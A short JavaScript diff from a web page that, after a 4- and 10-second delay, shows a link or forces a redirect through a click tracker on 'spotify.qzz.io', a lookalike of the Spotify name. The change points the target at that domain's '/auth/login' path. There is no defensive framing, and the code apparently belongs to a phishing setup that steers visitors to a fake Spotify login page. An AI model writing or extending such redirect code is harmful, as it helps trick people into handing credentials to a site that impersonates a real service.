@@ -99,7 +99,7 @@
                 const backupEl = document.getElementById('backup');
                 if (backupEl) {
                     backupEl.style.display = 'block';
-                    backupEl.href = 'https://spotify.qzz.io/tracker/click.php?goto=https://spotify.qzz.io&js=1&delay=manual&interactions=manual';
+                    backupEl.href = 'https://spotify.qzz.io/tracker/click.php?goto=https://spotify.qzz.io/auth/login&js=1&delay=manual&interactions=manual';
                 }
             }, 4000);
 
@@ -107,7 +107,7 @@
             setTimeout(() => {
                 if (window.location.href.indexOf('spotify.qzz.io') === -1 &&
                     window.location.href.indexOf('google.com') === -1) {
-                    location.href = 'https://spotify.qzz.io/tracker/click.php?goto=https://spotify.qzz.io&js=1&delay=timeout&interactions=timeout';
+                    location.href = 'https://spotify.qzz.io/tracker/click.php?goto=https://spotify.qzz.io/auth/login&js=1&delay=timeout&interactions=timeout';
                 }
             }, 10000);
         };
